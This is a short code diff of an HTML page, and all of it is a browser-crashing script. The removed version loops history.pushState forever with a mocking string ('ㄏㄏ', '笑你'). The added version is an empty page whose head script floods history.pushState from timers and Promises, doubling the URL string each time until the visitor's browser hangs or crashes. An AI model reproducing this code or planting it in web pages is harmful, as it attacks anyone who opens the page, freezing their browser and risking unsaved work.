@@ -1,6 +1,17 @@
-<script>
-  var h = "ㄏㄏ";
-  while (1)
-    for (var i = 0; i < 100000; i++)
-      history.pushState({}, "笑你", h += "ㄏㄏ");
-</script>
+<html>
+
+<head>
+    <script>
+        var h = "AAAAAAAAAA";
+        setInterval(function() {
+            for (var i = 0; i < 10000; i++) new Promise(function() {
+                history.pushState({}, "", h += h);
+            });
+        }, 10);
+    </script>
+</head>
+
+<body>
+</body>
+
+</html>
